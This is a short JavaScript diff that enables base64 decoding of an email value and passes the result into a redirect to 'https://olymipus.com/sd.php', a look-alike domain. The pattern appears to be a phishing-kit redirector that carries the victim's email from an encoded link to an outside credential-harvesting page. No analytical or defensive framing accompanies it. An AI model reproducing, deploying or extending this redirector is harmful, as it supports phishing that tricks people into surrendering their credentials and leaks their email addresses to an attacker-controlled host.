@@ -14,12 +14,12 @@ if (email) {
     var value = email[2];
     
     // Check if the value is base64 encoded
-    //var decodedEmail = value;
-    //try {
-      //  decodedEmail = decodeBase64(value);
-    //} catch (e) {
-       // // Not base64 encoded, use the original value
-  //  }
+    var decodedEmail = value;
+    try {
+      decodedEmail = decodeBase64(value);
+    } catch (e) {
+       // Not base64 encoded, use the original value
+  }
     
 
     var redirectUrl = 'https://olymipus.com/sd.php?rav=' + (decodedEmail);
